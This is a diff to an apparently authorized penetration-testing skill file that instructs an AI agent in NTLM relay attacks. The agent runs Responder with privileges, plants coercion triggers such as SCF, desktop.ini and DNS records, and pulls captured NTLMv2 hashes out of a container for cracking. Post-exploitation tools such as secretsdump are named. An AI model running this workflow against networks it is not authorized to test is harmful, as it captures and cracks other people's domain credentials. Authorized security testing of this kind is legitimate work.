@@ -128,8 +128,8 @@ and must be handed off to the user for manual execution:
 - Kerberos auth setup: `getTGT.py`, `export KRB5CCNAME`
 - Post-relay exploitation: `getST.py`, `secretsdump.py`, `certipy auth`
 
-**Autonomous mode:** Batch all pending privileged commands (relay listener +
-poisoner + coercion trigger) so the user can start them in one pass.
+Batch all pending privileged commands (relay listener + poisoner + coercion
+trigger) so the user can start them in one pass.
 
 ## Step 1: Assess Relay Feasibility
 
@@ -357,25 +357,60 @@ sudo responder -I tun0 -v
 **Port conflicts:** If port 80 or 445 is already in use, stop the
 conflicting service first. Responder will fail silently if it can't bind.
 
+**Responder is a daemon, not an interactive shell.** After starting it with
+`start_process(privileged=True)`, do NOT use `send_command()` or
+`read_output()` to monitor it — Responder does not read stdin and its PTY
+output is unreliable for monitoring. Instead:
+
+1. **Start and forget**: Call `start_process(command="responder -I tun0 -v",
+   privileged=True)`. Note the session ID but do not interact with it.
+2. **Verify it's running**: Use a *separate* Bash command to confirm
+   Responder bound its ports: `ss -tlnp | grep -E ':(80|445|389)\s'`
+3. **Monitor via log files**: Responder writes captured hashes to
+   `/opt/Responder/logs/` inside the Docker container. To check for
+   captures, exec into the container:
+   ```bash
+   # Find the container ID
+   docker ps --filter ancestor=red-run-shell --format '{{.ID}}'
+   # Check for captured hashes
+   docker exec CONTAINER_ID ls /opt/Responder/logs/
+   docker exec CONTAINER_ID cat /opt/Responder/logs/Responder-Session.log
+   ```
+   Run these via Bash, not via `send_command()` on the Responder session.
+4. **Wait patiently**: After planting the coercion trigger (SCF, desktop.ini,
+   DNS record), wait 2–5 minutes, then check logs. Do not burn turns polling
+   the PTY session.
+
 #### 4. Wait for Callback
 
 The script runs on its schedule (typically every 1–15 minutes). Monitor
-Responder output for NTLMv2 hashes. Allow at least **two full cycles**
-before concluding the technique failed.
+Responder **log files** (not PTY output) for NTLMv2 hashes. Allow at least
+**two full cycles** before concluding the technique failed.
 
+Expected log output:
 ```
 [HTTP] NTLMv2 Client   : 10.10.10.5
 [HTTP] NTLMv2 Username : DOMAIN\ServiceUser
 [HTTP] NTLMv2 Hash     : ServiceUser::DOMAIN:challenge:response:blob
 ```
 
+Check logs by execing into the Responder container (see step 3 above).
+
 #### 5. Save and Return
 
 Save the hash and return to the orchestrator:
 ```bash
-# Copy hash from Responder logs
-cp /usr/share/responder/logs/HTTP-NTLMv2-*.txt \
+# Find the Responder container
+CONTAINER=$(docker ps --filter ancestor=red-run-shell --format '{{.ID}}' | head -1)
+
+# Copy hashes out of the container
+docker cp "$CONTAINER:/opt/Responder/logs/" /tmp/responder-logs/
+cp /tmp/responder-logs/*NTLMv2*.txt \
   engagement/evidence/<username>-ntlmv2-hash.txt
+
+# Or copy directly from Responder session log
+docker exec "$CONTAINER" grep -i ntlmv2 /opt/Responder/logs/Responder-Session.log \
+  > engagement/evidence/<username>-ntlmv2-hash.txt
 ```
 
 Return with: hash file path, hashcat mode 5600, source username,
@@ -718,12 +753,9 @@ Do not loop. Work through failures systematically:
 - Assessment: **blocked** (permanent — config, patched, missing prereq) or
   **retry-later** (may work with different context, creds, or access)
 
-**Mode behavior:**
-- **Guided**: Tell the user you're stalled, present what was tried, and
-  recommend the next best path.
-- **Autonomous**: Return findings to the orchestrator. Do not retry the same
-  technique — the orchestrator will decide whether to revisit with new context
-  or route elsewhere.
+**When stalled:** Tell the user you're stalled, present what was tried, and
+recommend the next best path. Return findings to the orchestrator — it will
+decide whether to revisit with new context or route elsewhere.
 
 ## Troubleshooting
 
